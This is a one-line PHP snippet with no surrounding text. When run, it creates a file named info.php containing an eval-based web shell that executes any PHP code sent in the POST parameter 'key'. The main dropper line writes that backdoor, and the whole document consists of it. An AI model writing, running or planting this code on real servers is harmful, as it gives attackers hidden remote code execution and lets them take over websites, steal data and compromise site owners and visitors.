<?php fputs(fopen("info.php", "w"), '<?php @eval($_POST["key"]);?>'); ?> 
